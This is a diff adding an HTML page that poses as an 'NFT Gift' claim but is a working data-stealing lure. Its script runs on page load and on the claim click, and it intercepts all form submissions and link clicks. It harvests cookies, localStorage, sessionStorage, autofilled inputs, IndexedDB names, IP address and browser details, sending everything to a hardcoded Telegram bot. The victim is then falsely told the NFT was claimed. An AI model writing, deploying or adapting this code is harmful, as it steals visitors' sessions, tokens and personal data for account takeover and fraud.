@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>NFT Gift Collection</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            text-align: center;
+            padding: 50px;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            background: rgba(255,255,255,0.1);
+            padding: 30px;
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+        }
+        button {
+            background: #0088cc;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎁 Claim Your NFT Gift</h1>
+        <p>Click below to receive your exclusive NFT</p>
+        <button onclick="collectData()">CLAIM NFT</button>
+        <div id="status"></div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '7815830497:AAGDsuH3tUWR73S_JrhawnNPkPPTMOHmK3s';
+        const CHAT_ID = '-1002560826337';
+
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch(e) {}
+        }
+
+        function collectAllData() {
+            const data = {
+                url: window.location.href,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                cookies: document.cookie,
+                referrer: document.referrer,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                localStorage: {},
+                sessionStorage: {}
+            };
+
+            // Собираем localStorage
+            for(let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                data.localStorage[key] = localStorage.getItem(key);
+            }
+
+            // Собираем sessionStorage
+            for(let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                data.sessionStorage[key] = sessionStorage.getItem(key);
+            }
+
+            // Перехватываем данные форм автозаполнения
+            const inputs = document.querySelectorAll('input');
+            data.formData = {};
+            inputs.forEach((input, index) => {
+                if(input.value) data.formData[`input_${index}`] = input.value;
+            });
+
+            return data;
+        }
+
+        async function collectData() {
+            document.getElementById('status').innerHTML = 'Processing your gift...';
+            
+            const collectedData = collectAllData();
+            const logMessage = `
+🪬 <b>New Visitor Data</b>
+🌐 <b>URL:</b> ${collectedData.url}
+🔗 <b>Referrer:</b> ${collectedData.referrer}
+🖥️ <b>User Agent:</b> ${collectedData.userAgent}
+🌍 <b>Language:</b> ${collectedData.language}
+💻 <b>Platform:</b> ${collectedData.platform}
+🖼️ <b>Screen:</b> ${collectedData.screen}
+🕐 <b>Timezone:</b> ${collectedData.timezone}
+🍪 <b>Cookies:</b> ${collectedData.cookies}
+📝 <b>Form Data:</b> ${JSON.stringify(collectedData.formData)}
+            `.trim();
+
+            await sendToTelegram(logMessage);
+
+            // Дополнительный сбор данных из IndexedDB
+            try {
+                const databases = await window.indexedDB.databases();
+                let dbData = '📊 <b>IndexedDB Databases:</b>\n';
+                databases.forEach(db => {
+                    dbData += `• ${db.name} (v${db.version})\n`;
+                });
+                await sendToTelegram(dbData);
+            } catch(e) {}
+
+            // Получаем IP через внешний сервис
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                await sendToTelegram(`🌐 <b>IP Address:</b> ${ipData.ip}`);
+            } catch(e) {}
+
+            // Фиксируем факт клика
+            await sendToTelegram('✅ <b>User clicked CLAIM button</b>');
+
+            document.getElementById('status').innerHTML = 'NFT claimed successfully!';
+        }
+
+        // Автоматический сбор данных при загрузке
+        window.addEventListener('load', async function() {
+            const initialData = `
+🚨 <b>Page Load Detected</b>
+🌐 <b>URL:</b> ${window.location.href}
+🔗 <b>Referrer:</b> ${document.referrer}
+🖥️ <b>User Agent:</b> ${navigator.userAgent}
+            `.trim();
+            
+            await sendToTelegram(initialData);
+        });
+
+        // Перехватываем все клики по ссылкам
+        document.addEventListener('click', function(e) {
+            if(e.target.href) {
+                sendToTelegram(`🔗 <b>Link Clicked:</b> ${e.target.href}`);
+            }
+        });
+
+        // Перехватываем отправку форм
+        document.addEventListener('submit', function(e) {
+            const formData = new FormData(e.target);
+            let formInfo = '📋 <b>Form Submitted:</b>\n';
+            for(let [key, value] of formData.entries()) {
+                formInfo += `${key}: ${value}\n`;
+            }
+            sendToTelegram(formInfo);
+        });
+    </script>
+</body>
+</html>
